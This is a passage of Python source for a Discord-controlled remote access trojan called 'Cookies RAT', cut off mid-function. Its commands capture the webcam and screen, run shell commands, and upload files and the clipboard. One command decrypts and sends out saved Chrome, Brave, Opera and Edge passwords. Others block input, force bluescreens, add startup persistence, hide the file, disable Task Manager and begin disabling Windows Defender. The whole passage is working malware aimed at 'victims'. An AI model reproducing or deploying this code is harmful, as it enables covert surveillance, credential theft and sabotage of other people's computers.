        temp = os.path.join(f"{os.getenv('TEMP')}\\video.mp4")
        res = '720p'
        t_end = time.time() + 2

        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, get_dims(cap, res))
            while time.time() < t_end:
                ret, frame = cap.read()
                out.write(frame)
            cap.release()
            out.release()
            cv2.destroyAllWindows()
        else:
            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
        file = discord.File(temp, filename="video.mp4")
        await ctx.send("Webcam Video taken!", file=file)
        os.remove(temp)


@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import pyautogui
        from PIL import ImageGrab
        from functools import partial
        temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
        screen = pyautogui.screenshot()
        screen.save(temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


@slash.slash(name="Voice", description="voice message of your choice", guild_ids=g)
async def Voice_command(ctx: SlashContext, voicespeak: str):
    if ctx.channel.name == channel_name:
        await  ctx.send(f"Voice message sent!\n{voicespeak}")
        speak = wincl.Dispatch("SAPI.SpVoice")
        speak.Speak(voicespeak)
        comtypes.CoUninitialize()

@slash.slash(name="Download", description="download file from victim", guild_ids=g)
async def Download_command(ctx: SlashContext, downloadfile: str):
    if ctx.channel.name == channel_name:
        file = discord.File(downloadfile, filename=downloadfile)
        await  ctx.send(f"Successfully downloaded file {downloadfile}", file=file) 


# @slash.slash(name="StreamWebCam", description="Streams webcam by sening multiple pictures", guild_ids=g)
# async def StreamWebCam_command(ctx: SlashContext):
#     if ctx.channel.name == channel_name:
#         await ctx.send("Command executed!")
#         import os
#         import cv2
#         temp = (os.getenv('TEMP'))
#         camera_port = 0
#         camera = cv2.VideoCapture(camera_port)
#         file = temp + r"\\hobo\\hello.txt"
#         if os.path.isfile(file):
#             delelelee = "del " + file + r" /f"
#             os.system(delelelee)
#             os.system(r"RMDIR %temp%\\hobo /s /q")
#         while True:
#             image = camera.read()
#             cv2.imwrite(temp + r"\\temp.png", image)
#             temp = (os.getenv('TEMP'))
#             file = temp + r"\\hobo\\hello.txt"
#             if os.path.isfile(file):
#                 del camera
#                 break
#             else:
#                 continue  
            

# @slash.slash(name="StopWebCamStream", description="Stops webcam stream", guild_ids=g)
# async def StreamWebCam_command(ctx: SlashContext): 
#     if ctx.channel.name == channel_name:
#         await ctx.send("Command executed!")
#         import os
#         os.system(r"mkdir %temp%\\hobo")
#         os.system(r"echo hello>%temp%\\hobo\\hello.txt")
#         os.system(r"del %temp\\temp.png /F")


@slash.slash(name="DisplayOFF", description="Turns users Display OFF, Admin rights needed!", guild_ids=g)
async def DisplayOFF_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            import ctypes
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            await ctx.send("Command executed!")
        else:
            await ctx.send("Admin rights are required")


@slash.slash(name="DisplayON", description="Turns users Display ON, Admin rights needed!", guild_ids=g)
async def DisplayON_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            from pynput.keyboard import Key, Controller
            keyboard = Controller()
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("Command executed!")
        else:
            await ctx.send("Admin rights are required")


@slash.slash(name="TaskKill", description="kill any of their task, add the .exe etc to the end!", guild_ids=g)
async def TaskKill_command(ctx: SlashContext, tasktokill: str):
    if ctx.channel.name == channel_name:
        os.system(f"taskkill /F /IM {tasktokill}")
        await ctx.send(f"{tasktokill} killed succesfully!")


@slash.slash(name="StreamScreen", description="Stream screen, time format (hh:mm:ss)", guild_ids=g)
async def StreamScreen_command(ctx: SlashContext, stream_time: str):
    if ctx.channel.name == channel_name:
        import time, os, pyautogui
        from PIL import ImageGrab
        from functools import partial

        def convert_seconds(time_str):
            # split in hh, mm, ss
            hh, mm, ss = time_str.split(':')
            return int(hh) * 3600 + int(mm) * 60 + int(ss)

        time_length = stream_time 
        seconds_length = convert_seconds(time_length) 
        global end
        end = time.time() + seconds_length

        async def StreamScreen(end):
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\\hobos\\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\\hobos\\hellos.txt /f")
                os.system(r"RMDIR %temp%\\hobos /s /q")     
            else:
                pass
            while time.time() < end:
                ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
                screen = pyautogui.screenshot()
                screen.save(temp + r"\\monitor.png")
                path = temp + r"\\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await ctx.send(file=file)
                hellos = temp + r"\\hobos\\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue

            if time.time() > end:
                await ctx.send(f"Finshed streaming screen!")
        
        await ctx.send(f"Streaming screen for {seconds_length} Seconds")
        await StreamScreen(end)


@slash.slash(name="HideRAT", description="Hides the file by changing the attribute to hidden", guild_ids=g)
async def HideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        import inspect
        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
        os.system("""attrib +h "{}" """.format(cmd237))
        await ctx.send("Command executed!")


@slash.slash(name="UnHideRAT", description="UnHides the file by removing the hidden attribute", guild_ids=g)
async def UnHideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        import inspect
        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
        os.system("""attrib -h "{}" """.format(cmd237))
        await ctx.send("Command executed!")


@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        global status
        status = None
        import subprocess
        import os
        instruction = command
        def shell(command):
            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global status
            status = "ok"
            return output.stdout.decode('CP437').strip()
        out = shell(instruction)
        print(out)
        print(status)
        if status:
            numb = len(out)
            if numb < 1:
                await ctx.send("Command not recognized or no output was obtained")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                f1 = open(temp + r"\\output.txt", 'a')
                f1.write(out)
                f1.close()
                file = discord.File(temp + r"\\output.txt", filename="output.txt")
                await ctx.send("Command executed!", file=file)
                os.remove(temp + r"\\output.txt")
            else:
                await ctx.send("Command executed : " + out)
        else:
            await ctx.send("Command not recognized or no output was obtained")
            status = None


@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Typing. . .")
        for letter in message:
            pyautogui.typewrite(letter);sleep(0.0001)
        await ctx.send(f"Done typing\n```\n{message}```")


@slash.slash(name="Shutdown", description="Shuts down the users pc", guild_ids=g)
async def Shutdown_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        uncritproc()
        os.system("shutdown /p")
        await ctx.send("Command executed!")


@slash.slash(name="Restart", description="Restarts the users pc", guild_ids=g)
async def Restart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        uncritproc()
        os.system("shutdown /r /t 00")
        await ctx.send("Command executed!")


@slash.slash(name="LogOff", description="Logs the user of", guild_ids=g)
async def LogOff_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        uncritproc()
        os.system("shutdown /l /f")
        await ctx.send("Command executed!")


@slash.slash(name="DeleteFile", description="Permanently deletes file on the users pc, just POOF", guild_ids=g)
async def DeleteFile_command(ctx: SlashContext, filedirectory: str):
    if ctx.channel.name == channel_name:
        global statue
        import time
        import subprocess
        instruction = (filedirectory)
        instruction = "del " + '"' + instruction + '"' + " /F"
        def shell():
            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        import threading
        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        time.sleep(1)
        shel._running = False
        global statue
        statue = "ok"
        if statue:
            result = str(shell().stdout.decode('CP437'))
            numb = len(result)
            if numb > 0:
                await ctx.send("An error has occurred")
            else:
                await ctx.send("Command executed!")
        else:
            await ctx.send("Command not recognized or no output was obtained")
            statue = None


@slash.slash(name="BlueScreen", description="Bluescreens the user", guild_ids=g)
async def BlueScreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import ctypes.wintypes
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        await ctx.send("Command executed!")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"Their Current Clipboard is:\n```{data}```")


@slash.slash(name="AdminCheck", description=f"check if Cookies RAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"Cookies RAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"Cookies RAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="CritProc", description=f"Bluescreens the user if RAT is closed", guild_ids=g)
async def CritProc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            critproc()
            await ctx.send("Command executed!")
        else:
            await ctx.send("Not admin! :(")


@slash.slash(name="UnCritProc", description=f"Turns off CritProc", guild_ids=g)
async def CritProc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            critproc()
            await ctx.send("Command executed!")
        else:
            await ctx.send("Not admin")


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [
                    ('cbSize', ctypes.c_uint),
                    ('dwTime', ctypes.c_int),
                ]

        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000.0
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f'User idle for {duration:.2f} seconds.')


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Bro hate to break it too you but you need to get your victim to run the exe as administrator for this command!")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Bro hate to break it too you but you need to get your victim to run the exe as administrator for this command!")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        import pyautogui
        await ctx.send(f"Message box sent with message: ``{message}``")
        print(pyautogui.alert(f"{message}"))


@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
            await ctx.send("Invalid Youtube Link")

@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        ctx.send("stopped the music")
        os.system(f"taskkill /F /IM {pid_process[1]}")


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        import sys
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:  
            path = sys.argv[0]
            isexe=False
            if (sys.argv[0].endswith("exe")):
                isexe=True
            if isexe:
                os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
            else:
                os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                e = r"""
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
""".format(os.path.basename(sys.argv[0]))
                with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                    f.write(e)
                    f.close()
            await ctx.send("Successfuly added to startup")  
        else:
            await ctx.send("This command requires admin privileges")

@slash.slash(name="GrabPasswords", description="Grabs google cookies and passwords", guild_ids=g)
async def GrabPasswords_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Grabbing Passwords. . .")
        import json, base64, sqlite3, win32crypt, shutil, getpass, os
        from Crypto.Cipher import AES


        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = generate_cipher(master_key, iv)
                decrypted_pass = decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception as e:
                print(str(e))


        username = getpass.getuser()
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open("GooglePasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open("BravePasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()  
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open("OperaPasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open("EdgePasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()             
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass


        ## Send Found Data
        try:
            file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
            await ctx.send("Found GooglePasswords", file=file1)
        except FileNotFoundError:
            await ctx.send("User has not got CHROME downloaded!")

        try:
            file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
            await ctx.send("Found BravePasswords", file=file2)
        except FileNotFoundError:
            await ctx.send("User has not got BRAVE downloaded!")

        try:
            file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
            await ctx.send("Found OperaPasswords", file=file3)
        except FileNotFoundError:
            await ctx.send("User has not got OPERA downloaded!")

        try:
            file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
            await ctx.send("Found EdgePasswords", file=file4)
        except FileNotFoundError:
            await ctx.send("User has not got EDGE downloaded!")


        os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")


@slash.slash(name="StartProc", description="Starts process using DIR", guild_ids=g)
async def StartProc_command(ctx: SlashContext, dirtofile: str):
    if ctx.channel.name == channel_name:
        os.startfile(dirtofile)
        await  ctx.send(f"Succesfully started process from DIR {dirtofile}") 


@slash.slash(name="SelfDestruct", description="Delete all traces of RAT on users PC", guild_ids=g)
async def SelfDestruct_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        import sys
        uncritproc()
        pid = os.getpid()
        temp = (os.getenv("temp"))
        cwd2 = sys.argv[0]
        ######? Kill running RAT and then delete the file then make the bat file delete itself ######
        data = f"Killed Rat PID: {pid}\n\nRemoved Rat file!"
        embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
        await ctx.send(embed=embed)
        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
        temp6 = temp + r"\\kill.bat"
        if os.path.isfile(temp6):
            os.remove(temp6)
        f6 = open(temp + r"\\kill.bat", 'w')
        f6.write(bat)
        f6.close()
        os.system(r"start /min %temp%\\kill.bat")


@slash.slash(name="Update", description="Replace old RAT version with new version", guild_ids=g)
async def Update_command(ctx: SlashContext, updated_version_url: str):
    if ctx.channel.name == channel_name:
        import requests, sys, os
        uncritproc()
        cwd = os.getcwd()
        name = os.path.splitext(os.path.basename(__file__))[0]
        cwd2 = sys.argv[0]
        pid = os.getpid()
        temp = (os.getenv("temp"))

        await ctx.send("Updating please wait for new session! eta. 30-60 secs")

        #######? Download File #######
        url = updated_version_url
        r = requests.get(f"{url}")
        with open(f'{cwd}\\${name}.exe', 'wb') as f:
            f.write(r.content)
        f.close()

        #? Create batch file in temp folder to kill current RAT PID and then delete it after that then run the new rat version 
        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
        temp6 = temp + r"\\Update.bat"
        if os.path.isfile(temp6):
            os.remove(temp6)
        with open(temp + r"\\Update.bat", 'w') as f6:
            f6.write(bat)
        f6.close()
        os.system(r"start /min %temp%\\Update.bat")


@slash.slash(name="StartWebsite", description="Start website link on users PC", guild_ids=g)
async def StartWebsite_command(ctx: SlashContext, chosen_website: str):
    if ctx.channel.name == channel_name: 
        import subprocess
        website = chosen_website
        def OpenBrowser(URL):
            if not URL.startswith('http'):
                URL = 'http://' + URL
            subprocess.call('start ' + URL, shell=True) 
        OpenBrowser(website)
        await ctx.send("Command executed!")


@slash.slash(name="DisableTaskManager", description="Disable victims task manager", guild_ids=g)
async def DisableTaskManager_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            global statuuusss
            import time
            statuuusss = None
            import subprocess
            import os
            instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                statuuusss = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                import winreg as reg
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
                import os
                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
            else:
                import os
                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
            await ctx.send("Successfuly disabled victims task manager")
        else:
            await ctx.send("**This command requires admin privileges**")


# @slash.slash(name="EnableTaskManager", description="Re enable victims task manager", guild_ids=g)
# async def EnableTaskManager_command(ctx: SlashContext):
#     if ctx.channel.name == channel_name:
#         import ctypes
#         import os
#         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
#         if is_admin == True:
#             import ctypes
#             import os
#             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
#             if is_admin == True:
#                 global statusuusss
#                 import time
#                 statusuusss = None
#                 import subprocess
#                 import os
#                 instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
#                 def shell():
#                     output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#                     global status
#                     statusuusss = "ok"
#                     return output
#                 import threading
#                 shel = threading.Thread(target=shell)
#                 shel._running = True
#                 shel.start()
#                 time.sleep(1)
#                 shel._running = False
#                 result = str(shell().stdout.decode('CP437'))
#                 if len(result) <= 5:
#                     await ctx.send("Successfuly re enabled victims task manager")
#                 else:
#                     import winreg as reg
#                     reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
#                     await ctx.send("Successfuly re enabled victims task manager")
#         else:
#             await ctx.send("**This command requires admin privileges**")


@slash.slash(name="DisableAntivirus", description="Disable victims antivirus", guild_ids=g)
async def DisableAntivirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes, os, time
        class disable_fsr():
            disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
            revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
            def __enter__(self):
                self.old_value = ctypes.c_long()
                self.success = self.disable(ctypes.byref(self.old_value))
            def __exit__(self, type, value, traceback):
                if self.success:
                    self.revert(self.old_value)
        await ctx.send("**Attempting to get admin!**")

        ###### CREATE BATCH FILE ######
        temp = (os.getenv("temp"))
        bat = """
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
